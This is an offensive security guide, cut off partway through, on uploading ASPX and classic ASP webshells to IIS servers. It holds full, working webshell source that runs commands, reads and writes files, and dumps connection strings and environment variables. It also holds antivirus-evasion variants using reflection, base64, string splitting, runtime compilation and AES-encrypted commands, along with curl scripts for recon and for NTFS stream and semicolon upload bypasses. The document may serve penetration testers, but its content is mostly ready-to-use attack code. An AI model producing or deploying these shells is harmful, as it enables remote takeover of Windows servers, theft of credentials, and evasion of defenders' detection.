---
title: ASPX Webshell Upload
description: ASPX Webshell Upload — Exploit IIS & ASP.NET File Upload for Remote Code Execution
navigation:
  icon: i-lucide-file-terminal
  title: ASPX Webshell Upload
---

## ASPX Webshell Upload

::badge
**Critical Severity — CWE-434 / CWE-94 / CWE-553**
::

::note
**ASPX webshells** are server-side scripts written in C# or VB.NET that execute on Microsoft IIS (Internet Information Services) servers running ASP.NET. When an application running on IIS allows uploading `.aspx` files — or fails to properly restrict executable extensions — an attacker can upload a webshell that provides full command execution, file system access, database interaction, and lateral movement capabilities on the Windows server. IIS environments present unique attack surfaces: NTFS alternate data streams, case-insensitive filesystems, `web.config` handler overrides, short filename (8.3) conventions, multiple executable ASP.NET extensions, and ViewState deserialization — all of which create bypass opportunities that don't exist on Linux/Apache targets.
::

---

## Vulnerability Anatomy

::accordion
  :::accordion-item{icon="i-lucide-cpu" label="How ASPX Webshell Execution Works"}
  1. Attacker uploads a file containing C#/VB.NET server-side code with an `.aspx` extension
  2. IIS receives the request for the uploaded `.aspx` file
  3. IIS handler mapping matches `.aspx` → `System.Web.UI.PageHandlerFactory`
  4. ASP.NET runtime compiles the `.aspx` page to a .NET assembly (first request)
  5. The compiled assembly executes server-side code — `Process.Start()`, `cmd.exe /c`, etc.
  6. Command output is returned in the HTTP response
  7. Attacker has full OS-level command execution as the IIS application pool identity (usually `IIS APPPOOL\AppPoolName` or `NT AUTHORITY\NETWORK SERVICE`)

  **Key difference from PHP:** ASPX files are **compiled** on first request, not interpreted. This means the first request is slower, but subsequent requests are faster. It also means compilation errors produce detailed error pages that can leak path information.
  :::

  :::accordion-item{icon="i-lucide-layers" label="IIS Handler Mapping — What Executes as Code"}
  | Extension | Handler | Executes As | Notes |
  | --------- | ------- | ----------- | ----- |
  | `.aspx` | `PageHandlerFactory` | ASP.NET Web Forms page | Primary target |
  | `.ashx` | `SimpleHandlerFactory` | ASP.NET HTTP Handler | Generic handler |
  | `.asmx` | `WebServiceHandlerFactory` | ASP.NET Web Service | SOAP endpoint |
  | `.ascx` | User Control | Not directly accessible | Must be included |
  | `.asp` | `ASPClassic` (ISAPI) | Classic ASP (VBScript) | Legacy, still common |
  | `.asa` | `ASPClassic` | ASP Application file | Global.asa equivalent |
  | `.cer` | `ASPClassic` | Treated as ASP | Often overlooked |
  | `.cdx` | `ASPClassic` | Treated as ASP | Rare, sometimes works |
  | `.cshtml` | `RazorHandler` | Razor C# page | MVC/Razor Pages |
  | `.vbhtml` | `RazorHandler` | Razor VB.NET page | Less common |
  | `.svc` | `WCF Handler` | WCF Service | Service endpoint |
  | `.config` | `ConfigHandler` | XML Configuration | web.config abuse |
  | `.rem` | `.NET Remoting` | Remoting endpoint | Deserialization target |
  | `.soap` | `SOAP Handler` | SOAP endpoint | Legacy |
  :::

  :::accordion-item{icon="i-lucide-shield-alert" label="IIS-Specific Attack Surface"}
  - **NTFS case-insensitivity** — `.ASPX`, `.aSpX`, `.Aspx` all map to the same handler
  - **NTFS Alternate Data Streams** — `shell.aspx::$DATA` may bypass extension checks
  - **Short filename (8.3)** — `SHELL~1.ASP` may bypass long filename validation
  - **web.config upload** — Override handler mappings per-directory
  - **IIS semicolon parsing** — `shell.aspx;.jpg` may bypass extension checks
  - **Double encoding** — `%252e%2561%2573%2570%2578` may bypass WAF
  - **ViewState deserialization** — Exploitable if machine key is known
  - **IIS tilde enumeration** — Discover existing files via `~` character
  - **Handler mapping override** — web.config can map `.jpg` to ASP.NET handler
  - **applicationHost.config** — Machine-level configuration (if writable)
  :::

  :::accordion-item{icon="i-lucide-target" label="Impact"}
  | Impact | Details | Severity |
  | ------ | ------- | -------- |
  | **OS Command Execution** | Execute `cmd.exe`, `powershell.exe` as IIS identity | Critical |
  | **File System Access** | Read/write/delete any file the app pool can access | Critical |
  | **Database Access** | Connection strings in web.config → direct DB access | Critical |
  | **Active Directory Recon** | Domain enumeration from domain-joined IIS server | High |
  | **Credential Theft** | Extract web.config secrets, machine keys, connection strings | Critical |
  | **Lateral Movement** | Pivot to internal network via IIS server | Critical |
  | **Persistence** | ASPX shell survives app pool recycles | High |
  | **Privilege Escalation** | Potato attacks, service account abuse | Critical |
  :::
::

---

## Reconnaissance & Target Analysis

### IIS & ASP.NET Detection

::tabs
  :::tabs-item{icon="i-lucide-radar" label="Server Fingerprinting"}
  ```bash
  # ── Confirm target runs IIS + ASP.NET ──

  # HTTP headers
  curl -sI https://target.com | grep -iE "^server:|^x-powered-by:|^x-aspnet|^x-aspnetmvc"
  # Look for:
  #   Server: Microsoft-IIS/10.0
  #   X-Powered-By: ASP.NET
  #   X-AspNet-Version: 4.0.30319
  #   X-AspNetMvc-Version: 5.2

  # Detailed fingerprint
  whatweb https://target.com -v 2>/dev/null | grep -iE "iis|asp|\.net|microsoft"

  # ASP.NET version detection
  curl -sI https://target.com | grep -i "x-aspnet-version"
  # 4.0.30319 = .NET Framework 4.x
  # 2.0.50727 = .NET Framework 2.0/3.5

  # IIS version from error pages
  curl -s "https://target.com/nonexistent_xyz_$$" | grep -iE "iis|microsoft|asp\.net|runtime error"

  # Check for common IIS paths
  for path in "/_vti_bin/" "/aspnet_client/" "/iisstart.htm" "/iisstart.png" \
               "/certsrv/" "/exchange/" "/owa/" "/ecp/" "/autodiscover/" \
               "/web.config" "/Global.asax" "/App_Data/" "/bin/" \
               "/Trace.axd" "/elmah.axd" "/.well-known/"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com${path}" 2>/dev/null)
      [ "$STATUS" != "404" ] && echo "[${STATUS}] ${path}"
  done

  # Detect .NET Framework vs .NET Core
  curl -sI https://target.com | grep -i "server"
  # "Kestrel" = .NET Core/5+
  # "Microsoft-IIS" = IIS (may host .NET Framework or .NET Core)

  # Check for detailed errors (CustomErrors off)
  curl -s "https://target.com/test.aspx" | grep -iE "stack trace|exception|error|<title>.*error"
  curl -s "https://target.com/web.config" | head -20

  # ASP.NET trace endpoint
  curl -s "https://target.com/Trace.axd" | head -20
  # If accessible → application trace with request details

  # ELMAH error log
  curl -s "https://target.com/elmah.axd" | head -20
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="Upload Endpoint Discovery"}
  ```bash
  # ── Find upload endpoints on IIS targets ──

  # Crawl
  katana -u https://target.com -d 5 -jc -kf -ef css,woff,woff2 -o crawl.txt
  grep -iE "upload|import|attach|file|media|image|document|avatar|resume|logo|photo" crawl.txt | sort -u

  # IIS-specific upload paths
  ffuf -u https://target.com/FUZZ -w <(cat << 'EOF'
  upload.aspx
  fileupload.aspx
  Upload/Upload.aspx
  admin/upload.aspx
  api/upload
  api/v1/upload
  api/files/upload
  FileHandler.ashx
  UploadHandler.ashx
  ImageUpload.ashx
  api/File/Upload
  api/Attachment/Upload
  Content/Upload
  Media/Upload
  Admin/FileManager
  Admin/MediaManager
  CKEditor/Upload
  Editor/Upload
  Telerik.Web.UI.WebResource.axd
  Telerik.Web.UI.DialogHandler.aspx
  ScriptResource.axd
  WebResource.axd
  EOF
  ) -mc 200,301,302,401,403,405

  # Check for Telerik UI (common ASPX upload vector)
  curl -s "https://target.com/Telerik.Web.UI.WebResource.axd?type=rau" -o /dev/null -w "%{http_code}"
  curl -s "https://target.com/Telerik.Web.UI.DialogHandler.aspx" -o /dev/null -w "%{http_code}"

  # Check for common ASPX CMS upload paths
  for cms_path in \
      "/umbraco/backoffice/UmbracoApi/Media/PostAddFile" \
      "/sitecore/shell/Applications/Media/Upload" \
      "/EPiServer/CMS/Content/Upload" \
      "/DotNetNuke/DesktopModules/Upload" \
      "/Sitefinity/Upload" \
      "/kentico/CMSPages/Upload.aspx"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com${cms_path}" 2>/dev/null)
      [ "$STATUS" != "404" ] && echo "[${STATUS}] ${cms_path}"
  done

  # Historical upload URLs
  echo "target.com" | gau --threads 10 | grep -iE "upload|file|attach|import" | sort -u
  echo "target.com" | waybackurls | grep -iE "\.ashx|upload|handler|file" | sort -u
  ```
  :::

  :::tabs-item{icon="i-lucide-microscope" label="Validation Detection"}
  ```bash
  # ── Determine what upload validation is in place ──

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  echo "═══ ASPX Upload Validation Detection ═══"

  # Test 1: Direct ASPX upload
  echo '<%@ Page Language="C#" %><% Response.Write("test"); %>' > /tmp/test.aspx
  STATUS=$(curl -s -o /tmp/resp.txt -w "%{http_code}" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/test.aspx;filename=test.aspx" -H "Cookie: $COOKIE")
  echo "[${STATUS}] Direct .aspx upload"
  [ "$STATUS" = "200" ] && echo "    → DIRECT ASPX UPLOAD WORKS!" && cat /tmp/resp.txt

  # Test 2: Extension blacklist detection
  for ext in aspx ashx asmx asp asa cer ascx cshtml vbhtml svc config \
             aspx. "aspx " aspx%00 aspx%20 aspx:::\$DATA \
             ASPX aSpX Aspx aSPX \
             aspx.jpg jpg.aspx aspx%3b.jpg; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/test.aspx;filename=test.${ext}" -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] ACCEPTED: .${ext}"
  done

  # Test 3: Content-Type validation
  for ct in "image/jpeg" "image/png" "application/octet-stream" "text/plain" \
            "application/x-aspx" "text/html" "text/xml"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/test.aspx;filename=test.aspx;type=${ct}" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] ACCEPTED with CT: ${ct}"
  done

  # Test 4: IIS-specific bypass attempts
  echo "[*] IIS-specific bypass tests:"

  # Semicolon parsing
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/test.aspx;filename=test.aspx;.jpg" -H "Cookie: $COOKIE")
  echo "    [${STATUS}] shell.aspx;.jpg (semicolon bypass)"

  # NTFS ADS
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/test.aspx;filename=test.aspx:::\$DATA" -H "Cookie: $COOKIE")
  echo "    [${STATUS}] shell.aspx:::\$DATA (NTFS ADS)"

  # Trailing dot
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/test.aspx;filename=test.aspx." -H "Cookie: $COOKIE")
  echo "    [${STATUS}] shell.aspx. (trailing dot)"

  # Trailing space
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/test.aspx;filename=test.aspx%20" -H "Cookie: $COOKIE")
  echo "    [${STATUS}] shell.aspx%20 (trailing space)"

  rm -f /tmp/test.aspx /tmp/resp.txt
  ```
  :::
::

---

## ASPX Webshell Payloads

::warning
ASPX webshells run as compiled C# or VB.NET code on the IIS server. They execute under the IIS application pool identity and have access to the full .NET Framework API surface.
::

### Core Webshell Variants

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Command Execution Shells"}
  ```bash
  # ═══════════════════════════════════════
  # ASPX Webshell — C# Command Execution
  # ═══════════════════════════════════════

  # ── Minimal one-liner (smallest possible) ──
  cat > shell_minimal.aspx << 'EOF'
  <%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]).StandardOutput.ReadToEnd();%>
  EOF

  # ── Standard command shell (reliable) ──
  cat > shell_cmd.aspx << 'ASPXEOF'
  <%@ Page Language="C#" %>
  <%@ Import Namespace="System.Diagnostics" %>
  <script runat="server">
  protected void Page_Load(object sender, EventArgs e)
  {
      string cmd = Request["cmd"];
      if (!string.IsNullOrEmpty(cmd))
      {
          ProcessStartInfo psi = new ProcessStartInfo();
          psi.FileName = "cmd.exe";
          psi.Arguments = "/c " + cmd;
          psi.RedirectStandardOutput = true;
          psi.RedirectStandardError = true;
          psi.UseShellExecute = false;
          psi.CreateNoWindow = true;
          Process p = Process.Start(psi);
          string output = p.StandardOutput.ReadToEnd();
          string error = p.StandardError.ReadToEnd();
          p.WaitForExit();
          Response.Write("<pre>" + Server.HtmlEncode(output + error) + "</pre>");
      }
  }
  </script>
  ASPXEOF

  # ── PowerShell execution shell ──
  cat > shell_ps.aspx << 'ASPXEOF'
  <%@ Page Language="C#" %>
  <%@ Import Namespace="System.Diagnostics" %>
  <script runat="server">
  protected void Page_Load(object sender, EventArgs e)
  {
      string cmd = Request["cmd"];
      if (!string.IsNullOrEmpty(cmd))
      {
          ProcessStartInfo psi = new ProcessStartInfo();
          psi.FileName = "powershell.exe";
          psi.Arguments = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command " + cmd;
          psi.RedirectStandardOutput = true;
          psi.RedirectStandardError = true;
          psi.UseShellExecute = false;
          psi.CreateNoWindow = true;
          Process p = Process.Start(psi);
          Response.Write("<pre>" + Server.HtmlEncode(p.StandardOutput.ReadToEnd()) + "</pre>");
          p.WaitForExit();
      }
  }
  </script>
  ASPXEOF

  # ── Dual mode: cmd.exe + PowerShell ──
  cat > shell_dual.aspx << 'ASPXEOF'
  <%@ Page Language="C#" %>
  <%@ Import Namespace="System.Diagnostics" %>
  <script runat="server">
  protected void Page_Load(object sender, EventArgs e)
  {
      string cmd = Request["cmd"];
      string ps = Request["ps"];
      string exec = !string.IsNullOrEmpty(ps) ? ps : cmd;
      string shell = !string.IsNullOrEmpty(ps) ? "powershell.exe" : "cmd.exe";
      string args = !string.IsNullOrEmpty(ps)
          ? "-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command " + exec
          : "/c " + exec;

      if (!string.IsNullOrEmpty(exec))
      {
          ProcessStartInfo psi = new ProcessStartInfo(shell, args);
          psi.RedirectStandardOutput = true;
          psi.RedirectStandardError = true;
          psi.UseShellExecute = false;
          psi.CreateNoWindow = true;
          Process p = Process.Start(psi);
          string output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
          p.WaitForExit();
          Response.Write("<pre>" + Server.HtmlEncode(output) + "</pre>");
      }
  }
  </script>
  ASPXEOF
  # Usage: ?cmd=whoami OR ?ps=Get-Process
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Advanced Feature Shells"}
  ```csharp [shell_advanced.aspx]
  <%@ Page Language="C#" %>
  <%@ Import Namespace="System.Diagnostics" %>
  <%@ Import Namespace="System.IO" %>
  <%@ Import Namespace="System.Net" %>
  <%@ Import Namespace="System.Text" %>
  <script runat="server">
  protected void Page_Load(object sender, EventArgs e)
  {
      string action = Request["action"];
      string param = Request["param"];
      string param2 = Request["param2"];

      Response.ContentType = "text/plain";

      switch (action)
      {
          case "cmd":
              // Command execution
              var psi = new ProcessStartInfo("cmd.exe", "/c " + param);
              psi.RedirectStandardOutput = true;
              psi.RedirectStandardError = true;
              psi.UseShellExecute = false;
              psi.CreateNoWindow = true;
              var p = Process.Start(psi);
              Response.Write(p.StandardOutput.ReadToEnd());
              Response.Write(p.StandardError.ReadToEnd());
              p.WaitForExit();
              break;

          case "ps":
              // PowerShell execution
              psi = new ProcessStartInfo("powershell.exe",
                  "-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command " + param);
              psi.RedirectStandardOutput = true;
              psi.RedirectStandardError = true;
              psi.UseShellExecute = false;
              psi.CreateNoWindow = true;
              p = Process.Start(psi);
              Response.Write(p.StandardOutput.ReadToEnd());
              p.WaitForExit();
              break;

          case "read":
              // File read
              if (File.Exists(param))
                  Response.Write(File.ReadAllText(param));
              else
                  Response.Write("File not found: " + param);
              break;

          case "write":
              // File write (param=path, param2=content)
              File.WriteAllText(param, param2);
              Response.Write("Written to: " + param);
              break;

          case "download":
              // File download
              if (File.Exists(param))
              {
                  Response.ContentType = "application/octet-stream";
                  Response.AddHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(param));
                  Response.WriteFile(param);
              }
              break;

          case "upload":
              // File upload via POST
              if (Request.Files.Count > 0)
              {
                  var f = Request.Files[0];
                  string savePath = param ?? Server.MapPath("~/uploads/");
                  f.SaveAs(Path.Combine(savePath, f.FileName));
                  Response.Write("Saved: " + Path.Combine(savePath, f.FileName));
              }
              break;

          case "dir":
              // Directory listing
              string dirPath = param ?? Server.MapPath("~/");
              foreach (string d in Directory.GetDirectories(dirPath))
                  Response.Write("[DIR]  " + d + "\n");
              foreach (string f2 in Directory.GetFiles(dirPath))
                  Response.Write("[FILE] " + f2 + " (" + new FileInfo(f2).Length + " bytes)\n");
              break;

          case "info":
              // System information
              Response.Write("Machine: " + Environment.MachineName + "\n");
              Response.Write("User: " + Environment.UserName + "\n");
              Response.Write("Domain: " + Environment.UserDomainName + "\n");
              Response.Write("OS: " + Environment.OSVersion + "\n");
              Response.Write(".NET: " + Environment.Version + "\n");
              Response.Write("64-bit: " + Environment.Is64BitOperatingSystem + "\n");
              Response.Write("Path: " + Server.MapPath("~/") + "\n");
              Response.Write("Drives: " + string.Join(", ", DriveInfo.GetDrives().Select(d => d.Name)) + "\n");
              break;

          case "connstr":
              // Extract connection strings from web.config
              foreach (System.Configuration.ConnectionStringSettings cs in
                  System.Configuration.ConfigurationManager.ConnectionStrings)
              {
                  Response.Write(cs.Name + " = " + cs.ConnectionString + "\n");
              }
              break;

          case "env":
              // Environment variables
              foreach (System.Collections.DictionaryEntry ev in Environment.GetEnvironmentVariables())
                  Response.Write(ev.Key + "=" + ev.Value + "\n");
              break;

          default:
              Response.Write("ASPX Shell Active\n");
              Response.Write("Actions: cmd, ps, read, write, download, upload, dir, info, connstr, env\n");
              Response.Write("Usage: ?action=cmd&param=whoami\n");
              break;
      }
  }
  </script>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Classic ASP Shells (.asp)"}
  ```bash
  # ═══════════════════════════════════════
  # Classic ASP (VBScript) Webshells
  # For IIS servers with Classic ASP enabled
  # ═══════════════════════════════════════

  # ── Minimal one-liner ──
  cat > shell.asp << 'EOF'
  <%eval request("cmd")%>
  EOF

  # ── Command execution shell ──
  cat > shell_cmd.asp << 'ASPEOF'
  <%
  Dim cmd
  cmd = Request("cmd")
  If cmd <> "" Then
      Dim oShell, oExec, output
      Set oShell = CreateObject("WScript.Shell")
      Set oExec = oShell.Exec("cmd.exe /c " & cmd)
      output = oExec.StdOut.ReadAll()
      Response.Write "<pre>" & Server.HTMLEncode(output) & "</pre>"
      Set oExec = Nothing
      Set oShell = Nothing
  End If
  %>
  ASPEOF

  # ── File system shell ──
  cat > shell_fs.asp << 'ASPEOF'
  <%
  Dim action, param
  action = Request("action")
  param = Request("param")

  If action = "cmd" Then
      Set s = CreateObject("WScript.Shell")
      Set e = s.Exec("cmd.exe /c " & param)
      Response.Write "<pre>" & e.StdOut.ReadAll() & "</pre>"
  ElseIf action = "read" Then
      Set fso = CreateObject("Scripting.FileSystemObject")
      If fso.FileExists(param) Then
          Set f = fso.OpenTextFile(param, 1)
          Response.Write "<pre>" & Server.HTMLEncode(f.ReadAll()) & "</pre>"
          f.Close
      End If
  ElseIf action = "dir" Then
      Set fso = CreateObject("Scripting.FileSystemObject")
      Set folder = fso.GetFolder(param)
      For Each subfolder In folder.SubFolders
          Response.Write "[DIR]  " & subfolder.Name & vbCrLf
      Next
      For Each file In folder.Files
          Response.Write "[FILE] " & file.Name & " (" & file.Size & ")" & vbCrLf
      Next
  End If
  %>
  ASPEOF

  # ── .cer extension (treated as ASP on IIS) ──
  cp shell_cmd.asp shell.cer

  # ── .asa extension ──
  cp shell_cmd.asp shell.asa
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="ASHX Handler Shell"}
  ```csharp [shell.ashx]
  <%@ WebHandler Language="C#" Class="CmdHandler" %>

  using System;
  using System.Web;
  using System.Diagnostics;
  using System.IO;

  public class CmdHandler : IHttpHandler
  {
      public void ProcessRequest(HttpContext context)
      {
          context.Response.ContentType = "text/plain";
          string cmd = context.Request["cmd"];

          if (!string.IsNullOrEmpty(cmd))
          {
              ProcessStartInfo psi = new ProcessStartInfo();
              psi.FileName = "cmd.exe";
              psi.Arguments = "/c " + cmd;
              psi.RedirectStandardOutput = true;
              psi.RedirectStandardError = true;
              psi.UseShellExecute = false;
              psi.CreateNoWindow = true;

              Process p = Process.Start(psi);
              context.Response.Write(p.StandardOutput.ReadToEnd());
              context.Response.Write(p.StandardError.ReadToEnd());
              p.WaitForExit();
          }
          else
          {
              context.Response.Write("ASHX Handler Shell Active\n");
              context.Response.Write("Usage: ?cmd=whoami");
          }
      }

      public bool IsReusable { get { return false; } }
  }
  ```
  :::
::

### Obfuscated & AV-Evasion Shells

::tabs
  :::tabs-item{icon="i-lucide-eye-off" label="Base64 Encoded Shell"}
  ```bash
  # ── Base64 execution (bypasses string-based AV signatures) ──

  cat > shell_b64.aspx << 'ASPXEOF'
  <%@ Page Language="C#" %>
  <%@ Import Namespace="System.Diagnostics" %>
  <%@ Import Namespace="System.Text" %>
  <script runat="server">
  protected void Page_Load(object sender, EventArgs e)
  {
      // Accepts base64-encoded command
      string b64 = Request["b"];
      if (!string.IsNullOrEmpty(b64))
      {
          string cmd = Encoding.UTF8.GetString(Convert.FromBase64String(b64));
          var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
          psi.RedirectStandardOutput = true;
          psi.UseShellExecute = false;
          psi.CreateNoWindow = true;
          var p = Process.Start(psi);
          Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
          p.WaitForExit();
      }
  }
  </script>
  ASPXEOF
  # Usage: ?b=d2hvYW1p (base64 of "whoami")
  # Encode: echo -n "whoami" | base64

  # ── Command encoder helper ──
  encode_cmd() {
      echo -n "$1" | base64
  }
  # Usage: curl "https://target.com/uploads/shell_b64.aspx?b=$(encode_cmd 'dir C:\')"
  ```
  :::

  :::tabs-item{icon="i-lucide-eye-off" label="Reflection-Based Shell"}
  ```csharp [shell_reflection.aspx]
  <%@ Page Language="C#" %>
  <script runat="server">
  protected void Page_Load(object sender, EventArgs e)
  {
      // Uses reflection to avoid static analysis detection
      string c = Request["c"];
      if (c != null)
      {
          // Dynamically load System.Diagnostics.Process
          var asm = System.Reflection.Assembly.GetAssembly(typeof(System.Uri));
          var diagAsm = System.Reflection.Assembly.Load("System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089");
          var procType = diagAsm.GetType("System.Diagnostics.Process");
          var psiType = diagAsm.GetType("System.Diagnostics.ProcessStartInfo");

          // Create ProcessStartInfo via reflection
          var psi = Activator.CreateInstance(psiType);
          psiType.GetProperty("FileName").SetValue(psi, "cmd.exe");
          psiType.GetProperty("Arguments").SetValue(psi, "/c " + c);
          psiType.GetProperty("RedirectStandardOutput").SetValue(psi, true);
          psiType.GetProperty("UseShellExecute").SetValue(psi, false);
          psiType.GetProperty("CreateNoWindow").SetValue(psi, true);

          // Start process via reflection
          var startMethod = procType.GetMethod("Start", new Type[] { psiType });
          var proc = startMethod.Invoke(null, new object[] { psi });
          var stdOut = procType.GetProperty("StandardOutput").GetValue(proc);
          var readMethod = stdOut.GetType().GetMethod("ReadToEnd");
          string output = (string)readMethod.Invoke(stdOut, null);

          Response.Write("<pre>" + Server.HtmlEncode(output) + "</pre>");
      }
  }
  </script>
  ```
  :::

  :::tabs-item{icon="i-lucide-eye-off" label="String Concatenation Evasion"}
  ```bash
  # ── Split suspicious strings to bypass signature-based detection ──

  cat > shell_concat.aspx << 'ASPXEOF'
  <%@ Page Language="C#" %>
  <script runat="server">
  protected void Page_Load(object sender, EventArgs e)
  {
      string x = Request["x"];
      if (x != null)
      {
          // Construct "cmd.exe" from parts to avoid AV signature
          string s1 = "cm";
          string s2 = "d.e";
          string s3 = "xe";
          string shell = s1 + s2 + s3;

          // Construct "/c " from char codes
          string prefix = new string(new char[] { (char)47, (char)99, (char)32 });

          var psi = new System.Diagnostics.ProcessStartInfo(shell, prefix + x);
          psi.RedirectStandardOutput = true;
          psi.UseShellExecute = false;
          psi.CreateNoWindow = true;
          var p = System.Diagnostics.Process.Start(psi);
          Response.Write("<pre>" + Server.HtmlEncode(p.StandardOutput.ReadToEnd()) + "</pre>");
          p.WaitForExit();
      }
  }
  </script>
  ASPXEOF

  # ── Runtime compilation evasion ──
  cat > shell_compiler.aspx << 'ASPXEOF'
  <%@ Page Language="C#" %>
  <%@ Import Namespace="Microsoft.CSharp" %>
  <%@ Import Namespace="System.CodeDom.Compiler" %>
  <script runat="server">
  protected void Page_Load(object sender, EventArgs e)
  {
      string code = Request["code"];
      if (code != null)
      {
          // Compile and execute C# code at runtime
          CSharpCodeProvider provider = new CSharpCodeProvider();
          CompilerParameters cp = new CompilerParameters();
          cp.GenerateInMemory = true;
          cp.ReferencedAssemblies.Add("System.dll");

          string src = "using System; using System.Diagnostics; " +
              "public class X { public static string Run() { " + code + " } }";

          CompilerResults cr = provider.CompileAssemblyFromSource(cp, src);
          if (!cr.Errors.HasErrors)
          {
              var method = cr.CompiledAssembly.GetType("X").GetMethod("Run");
              Response.Write(method.Invoke(null, null));
          }
          else
          {
              foreach (CompilerError err in cr.Errors)
                  Response.Write(err.ErrorText + "<br>");
          }
      }
  }
  </script>
  ASPXEOF
  # Usage: ?code=var p=Process.Start(new ProcessStartInfo("cmd.exe","/c whoami"){RedirectStandardOutput=true,UseShellExecute=false});return p.StandardOutput.ReadToEnd();
  ```
  :::

  :::tabs-item{icon="i-lucide-eye-off" label="Encrypted Parameter Shell"}
  ```csharp [shell_encrypted.aspx]
  <%@ Page Language="C#" %>
  <%@ Import Namespace="System.Security.Cryptography" %>
  <%@ Import Namespace="System.Diagnostics" %>
  <%@ Import Namespace="System.Text" %>
  <%@ Import Namespace="System.IO" %>
  <script runat="server">
  // AES-encrypted command parameter
  // Key must be known to attacker; prevents casual discovery
  private static readonly byte[] KEY = Encoding.UTF8.GetBytes("0123456789ABCDEF"); // 16 bytes
  private static readonly byte[] IV = Encoding.UTF8.GetBytes("ABCDEF0123456789");

  private string Decrypt(string cipherB64)
  {
      using (Aes aes = Aes.Create())
      {
          aes.Key = KEY;
          aes.IV = IV;
          ICryptoTransform decryptor = aes.CreateDecryptor();
          byte[] cipher = Convert.FromBase64String(cipherB64);
          using (var ms = new MemoryStream(cipher))
          using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
          using (var sr = new StreamReader(cs))
              return sr.ReadToEnd();
      }
  }

  protected void Page_Load(object sender, EventArgs e)
  {
      string enc = Request["e"];
      if (enc != null)
      {
          string cmd = Decrypt(enc);
          var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
          psi.RedirectStandardOutput = true;
          psi.RedirectStandardError = true;
          psi.UseShellExecute = false;
          psi.CreateNoWindow = true;
          var p = Process.Start(psi);
          // Return output encrypted
          Response.Write(p.StandardOutput.ReadToEnd());
          p.WaitForExit();
      }
      else
      {
          Response.Write("Ready");
      }
  }
  </script>
  ```
  :::
::

---

## Upload Bypass Techniques

### IIS-Specific Bypasses

::accordion
  :::accordion-item{icon="i-lucide-shield-off" label="NTFS Alternate Data Streams"}
  ```bash
  # ── NTFS ADS bypasses — Windows treats these as the base file ──
  # shell.aspx::$DATA → Windows sees as shell.aspx
  # Validation may see "::$DATA" and miss the .aspx extension

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  SHELL='<%@ Page Language="C#" %><%Response.Write("ADS_BYPASS");%>'

  echo "$SHELL" > /tmp/ads_test.txt

  # Standard ADS bypass
  for name in \
      "shell.aspx:::\$DATA" \
      "shell.aspx::\$DATA" \
      "shell.aspx::::\$DATA" \
      "shell.aspx:::\$DATA....." \
      "shell.aspx:::\$DATA%20" \
      "shell.asp:::\$DATA" \
      "shell.ashx:::\$DATA" \
      "shell.cer:::\$DATA"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/ads_test.txt;filename=${name}" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] ACCEPTED: ${name}"
  done

  rm -f /tmp/ads_test.txt
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="IIS Semicolon Parsing"}
  ```bash
  # ── IIS treats semicolons as path delimiters in some configurations ──
  # shell.aspx;.jpg → IIS may process as .aspx, validation sees .jpg

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  SHELL='<%@ Page Language="C#" %><%Response.Write("SEMICOLON_BYPASS");%>'

  echo "$SHELL" > /tmp/semi_test.txt

  for name in \
      "shell.aspx;.jpg" \
      "shell.aspx;.png" \
      "shell.aspx;.gif" \
      "shell.aspx;.txt" \
      "shell.aspx;.pdf" \
      "shell.aspx;test.jpg" \
      "shell.aspx;1.jpg" \
      "shell.asp;.jpg" \
      "shell.ashx;.jpg" \
      "shell.cer;.jpg" \
      "shell.aspx;jpg" \
      "shell.aspx;image/jpeg"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/semi_test.txt;filename=${name}" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] ACCEPTED: ${name}"
  done

  # After upload, access with and without semicolon part
  # IIS may serve shell.aspx;.jpg as ASPX
  curl -s "https://target.com/uploads/shell.aspx;.jpg"
  curl -s "https://target.com/uploads/shell.aspx%3b.jpg"

  rm -f /tmp/semi_test.txt
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="Short Filename (8.3) Bypass"}
  ```bash
